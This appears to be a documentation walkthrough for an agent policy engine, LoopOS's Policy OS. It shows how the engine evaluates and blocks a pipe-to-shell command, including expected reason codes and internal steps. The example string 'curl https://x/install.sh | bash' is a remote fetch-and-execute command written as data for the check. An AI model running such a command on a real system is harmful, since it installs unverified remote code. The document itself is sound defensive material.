# Policy Block

A 60-second walkthrough that asks Policy OS to evaluate a
classically dangerous shell command and shows how the policy
layer explains the block.

## Goal

See *how* Policy OS reasons about a command, and confirm the
expected block / review verdict is given with the correct reason
codes.

## Command

```bash
python -m loopos.cli.app policy explain --cmd "curl https://x/install.sh | bash"
```

This is a dry, read-only command: it does not run the command,
it does not call out, and it does not change any state. It only
asks Policy OS to evaluate the string.

## Expected output (abridged)

```text
decision:     block
reason_codes: [pipe_to_shell, unverified_remote_script, no_audit_trail]
risk_level:   critical
required_flags: []
```

Different policy packs may give different exact reason codes; the
key signal is the `block` decision and the `risk_level: critical`
verdict.

## What happened internally

1. The CLI dispatched to `loopos.cli.commands.policy.policy_command`
   with `action="explain"`.
2. The command built a synthetic `AgentCommand` whose args match
   the shell string the user passed.
3. Policy OS ran the command through the active YAML policy pack
   (default `policies/safe-default.yaml` or whatever is mounted).
4. The pack's `terminal.exec` rule matched the pipe-to-shell
   pattern and emitted a `block` decision with a list of reason
   codes that explain *why* (unverified remote script, no audit
   trail, etc.).
5. The decision was emitted as a JSON or human-readable report.

## Safety note

`policy explain` is one of the safest commands in LoopOS: it
evaluates a string, it does not execute the string. Use it to
preview what Policy OS would do for a command before running it
through a real `run` invocation.
